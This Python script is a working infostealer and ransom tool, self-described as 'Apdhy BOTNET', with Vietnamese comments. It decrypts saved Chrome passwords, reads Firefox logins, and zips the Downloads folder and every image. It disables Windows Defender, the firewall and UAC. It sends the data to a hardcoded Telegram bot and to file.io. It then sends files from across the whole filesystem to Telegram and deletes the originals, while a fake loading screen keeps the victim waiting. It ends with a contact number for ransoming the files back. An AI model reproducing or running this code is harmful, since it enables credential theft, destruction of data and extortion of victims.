
import time 
import threading  
import shutil 
import os 
import sys
import zipfile
import sqlite3
import json
import platform
import socket
import psutil
import sys
import requests
import traceback
import datetime
import concurrent.futures

if os.name == "nt":
    import win32crypt
    import shutil 
    from Crypto.Cipher import AES
    
sys.stderr = open(os.devnull, 'w')

def get_public_ip():
    try:
        response = requests.get("https://api64.ipify.org?format=json")
        if response.status_code == 200:
            return response.json()["ip"]
    except Exception as e:
        return f"Lỗi: {e}"

# Thông tin Telegram Bot
TOKEN = "7697564639:AAGf7Fx8q8FZKCuUT4GjsIXUwOQESOO7M9g"
CHAT_ID = "7697564639"
TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

def get_pc_info():
    info = {}
    info["System"] = platform.system()
    info["Node Name"] = platform.node()
    info["Release"] = platform.release()
    info["Version"] = platform.version()
    info["Machine"] = platform.machine()
    info["Processor"] = platform.processor()
    info["RAM"] = str(round(psutil.virtual_memory().total / (1024 ** 3))) + " GB"  
    info["CPU Usage"] = str(psutil.cpu_percent()) + "%"  
    info["Disk Usage"] = str(psutil.disk_usage('/').percent) + "%"  
    info["Network Info"] = str(get_public_ip())
    return info

def get_android_info():
    info = {}
    try:
        info["Device Name"] = os.popen("getprop ro.product.model").read().strip()
        info["Android Version"] = os.popen("getprop ro.build.version.release").read().strip()
        info["RAM"] = os.popen("free -h | grep Mem | awk '{print $2}'").read().strip()  
        info["CPU Usage"] = os.popen("top -bn1 | grep 'Cpu(s)' | awk '{print 100 - $8}'").read().strip() + '%'
        info["Network Info"] = str(get_public_ip())
    except Exception as e:
        info["Error"] = "Không thể truy cập thông tin Android: " + str(e)
    return info

def save_info_to_file(file_name="system.txt"):
    system_info = {}
    current_platform = platform.system().lower()    
    if current_platform == "windows":
        system_info["PC Info"] = get_pc_info()
    elif current_platform == "linux":
        if os.path.exists("/data/data/com.termux"):
            system_info["Android Info"] = get_android_info()
        else:
            system_info["PC Info"] = get_pc_info()
    else:
        system_info["Error"] = "Nền tảng không hỗ trợ"    
    with open(file_name, 'w') as f:
        if "Error" in system_info:
            f.write(system_info["Error"] + "\n")
        else:
            for category, details in system_info.items():
                f.write(f"{category}:\n")
                for key, value in details.items():
                    f.write(f"  {key}: {value}\n")
                f.write("\n")

def compress_download_folder(output_filename="File.zip"):
    if os.name == "nt":  
        download_path = os.path.join(os.environ["USERPROFILE"], "Downloads")
    elif os.name == "posix":  
        possible_paths = [
            "/storage/emulated/0/Download",  
            "/sdcard/Download",             
            os.path.expanduser("~/Downloads")  
        ]
        download_path = None
        for path in possible_paths:
            if os.path.exists(path):
                download_path = path
                break
        if not download_path:
            raise FileNotFoundError("Không tìm thấy thư mục Downloads.")
    else:
        raise Exception("Unsupported platform.")
    output_zip = os.path.join(os.getcwd(), output_filename)
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(download_path):
            for name in dirs:
                folder_path = os.path.join(root, name)
                folder_zip_name = f"{name}.zip"
                folder_zip_path = os.path.join(download_path, folder_zip_name)
                with zipfile.ZipFile(folder_zip_path, 'w', zipfile.ZIP_DEFLATED) as folder_zip:
                    for folder_root, _, folder_files in os.walk(folder_path):
                        for file in folder_files:
                            abs_file_path = os.path.join(folder_root, file)
                            arcname = os.path.relpath(abs_file_path, folder_path)
                            folder_zip.write(abs_file_path, arcname)
                zipf.write(folder_zip_path, os.path.relpath(folder_zip_path, download_path))
                os.remove(folder_zip_path)  
            for name in files:
                file_path = os.path.join(root, name)
                if name == output_filename:  
                    continue
                zipf.write(file_path, os.path.relpath(file_path, download_path))

def compress_all_images(output_zip="Images.zip"):
    if os.name == "nt":  
        root_dirs = [os.environ["USERPROFILE"]]  
    elif os.name == "posix":  
        root_dirs = [
            "/storage/emulated/0",  
            "/sdcard",              
            os.path.expanduser("~")  
        ]
    else:
        raise Exception("Unsupported platform.")
    image_extensions = (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp")
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root_dir in root_dirs:
            if not os.path.exists(root_dir):
                continue
            for root, _, files in os.walk(root_dir):
                for file in files:
                    if file.lower().endswith(image_extensions):
                        full_path = os.path.join(root, file)
                        arcname = os.path.relpath(full_path, root_dir)  
                        zipf.write(full_path, arcname)

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except Exception as e:
        return None

def get_chrome_encryption_key():
    local_state_path = os.path.join(
        os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data\Local State"
    )
    try:
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.loads(file.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        return None

def get_chrome_passwords():
    key = get_chrome_encryption_key()
    if not key:
        return "Không thể lấy key mã hóa từ Chrome."    
    db_path = os.path.join(
        os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data\Default\Login Data"
    )
    temp_db_path = db_path + "_temp"
    shutil.copyfile(db_path, temp_db_path)    
    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = []
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            password = decrypt_password(encrypted_password, key)
            if password:
                data.append(f"{url} | {username} | {password}")
        cursor.close()
        conn.close()
        os.remove(temp_db_path)
        return data
    except Exception as e:
        os.remove(temp_db_path)
        return []

def get_firefox_passwords():
    try:
        firefox_profile = os.path.join(
            os.environ['APPDATA'], r"Mozilla\Firefox\Profiles"
        )
        profiles = os.listdir(firefox_profile)
        for profile in profiles:
            login_db = os.path.join(firefox_profile, profile, "logins.json")
            if os.path.exists(login_db):
                with open(login_db, 'r', encoding='utf-8') as file:
                    logins = json.load(file)
                data = []
                for login in logins['logins']:
                    data.append(f"{login['hostname']} | {login['encryptedUsername']} | {login['encryptedPassword']}")
                return data
        return "Không tìm thấy thông tin từ Firefox."
    except Exception as e:
        return "Không thể lấy dữ liệu từ Firefox."    

def compress_files_data_to_zip(output_zip="Browser.zip"):
    open("chrome.txt", 'w').write(get_chrome_passwords())
    open("firefox.txt", 'w').write(get_firefox_passwords())
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in ["chrome.txt", "firefox.txt"]:
            if os.path.exists(file):
                zipf.write(file, os.path.basename(file))
                os.remove(file)
    
def send_file_to_bot(file_path, link):
    try:
        token = TOKEN
        chat_id = CHAT_ID
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(file_path, 'rb') as file:
            data = {
                'chat_id': chat_id,  
                'caption': f'''Apdhy BOTNET 
>>> Date Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} <<<
>>> Link: {link} <<<
>>> Thông tin máy đã hack! <<<
>>> APDHY BOTNET <<<
>>> SYS Loading F2 <<<''',
            }
            files = {
                'document': file
            }
            requests.post(url, data=data, files=files)
    except Exception as e:
        print(f"Lỗi: {e}")

def upload_file(file_path):
    try:
        with open(file_path, "rb") as file:
            files = {'file': (file_path, file)}
            try:
                response = requests.post('https://file.io/', files=files)
                response.raise_for_status()
                data = response.json()
                return data.get('link', 'Link not found in response')
            except requests.exceptions.RequestException as e:
                return f"Error during request: {e}"
    except FileNotFoundError:
        return "File not found!"

list_file_send_tele = []

def stealer():
    try:
        save_info_to_file("system.txt")        
        compress_download_folder("File.zip")
        list_file_send_tele.append("File.zip")
        compress_all_images("Images.zip")
        list_file_send_tele.append("Images.zip")
        if os.name == 'nt':            
            os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
            os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f')
            os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
            os.system('netsh advfirewall set allprofiles state off')
            os.system('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f')
            os.system('sc config WinDefend start= disabled && sc stop WinDefend')
            os.system('sc config wscsvc start= disabled && sc stop wscsvc')
            compress_files_data_to_zip("Browser.zip")
            list_file_send_tele.append("Browser.zip")
        out_zip = f"{get_public_ip()}.zip"
        with zipfile.ZipFile(out_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in list_file_send_tele:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))  
                    os.remove(file)        
        if os.path.exists("system.txt"):
            if os.path.exists(out_zip):
                file_path = os.path.join(os.getcwd(), out_zip)
                link = upload_file(file_path)
            send_file_to_bot("system.txt", link)
            os.remove("system.txt")
            os.remove(out_zip)       
    except Exception as e:
        print(f"Lỗi: {e}")

with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
    futures = []
    futures.append(executor.submit(stealer))
    concurrent.futures.wait(futures)
    for future in futures:
        future.result()  

# Fake loading để giữ nạn nhân ở lại
def fake_loading():
    animations = ["|", "/", "-", "\\","LOADDING"]
    print("[+] Đang bắt đầu quá trình tải dữ liệu... Vui lòng đợi.")
    
    for _ in range(300):  # 5 phút đếm ngược, nhưng không hiển thị thời gian nữa
        print(f"\r[+] Đang tải các dữ liệu cần thiết để chạy tool  {animations[_ % 4]}", end="", flush=True)
        time.sleep(1)
        print(f"\r[+] Kiểm tra dử liệu github  {animations[_ % 4]}", end="", flush=True)
        time.sleep(1)
        print(f"\r[+] Check lại   {animations[_ % 4]}", end="", flush=True)
        time.sleep(1)
        print(f"\r[+] Xóa file rác  {animations[_ % 4]}", end="", flush=True)
        time.sleep(1)
    # Hiển thị thông báo khi hết thời gian
    print("\n")
    print("LIÊN HỆ ZALO: 0845670409 ĐỂ CHUỘC FILE!")

# Lấy danh sách file theo thứ tự ưu tiên: .py, .txt, ảnh
def find_files():
    file_extensions = (".py", ".txt", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp")

    root_dirs = ["/", "/storage/emulated/0", "/sdcard", os.environ.get("USERPROFILE", "")]  # Duyệt tất cả thư mục

    file_list = []

    # Lấy các file cần thiết
    for root_dir in root_dirs:
        if os.path.exists(root_dir):
            for root, _, files in os.walk(root_dir):
                for file in files:
                    if file.lower().endswith(file_extensions):
                        file_list.append(os.path.join(root, file))

    return file_list

# Gửi file gốc qua Telegram với cơ chế retry
def send_original_file(file_path, caption=""):
    retries = 3  # Số lần thử lại
    for attempt in range(retries):
        try:
            with open(file_path, "rb") as file:
                response = requests.post(TELEGRAM_URL, data={"chat_id": CHAT_ID, "caption": caption}, files={"document": file})
                # Kiểm tra nếu yêu cầu thành công
                if response.status_code == 200:
                    break
                else:
                    if attempt < retries - 1:
                        time.sleep(3)  # Thử lại sau 3 giây
        except Exception:
            if attempt < retries - 1:
                time.sleep(3)  # Thử lại sau 3 giây

# Xóa file gốc sau khi gửi
def delete_file(file_path):
    try:
        os.remove(file_path)
    except Exception as e:
        print(f"[-] Lỗi khi xóa file {file_path}: {e}")

# Đa luồng gửi tất cả file đồng thời
def send_files_in_parallel(files):
    threads = []
    for file_path in files:
        caption = f"File được lấy từ: {file_path}"

        # Gửi file gốc trước
        thread = threading.Thread(target=send_original_file, args=(file_path, caption))
        threads.append(thread)
        thread.start()

        # Xóa file gốc sau khi gửi
        thread = threading.Thread(target=delete_file, args=(file_path,))
        threads.append(thread)
        thread.start()

    # Chờ tất cả các thread hoàn thành
    for thread in threads:
        thread.join()

# Main function
def main():
    loading_thread = threading.Thread(target=fake_loading)
    loading_thread.start()

    # Gửi tất cả file theo thứ tự ưu tiên
    files = find_files()
    send_files_in_parallel(files)

    loading_thread.join()  # Chờ loading kết thúc

if __name__ == "__main__":
    main()
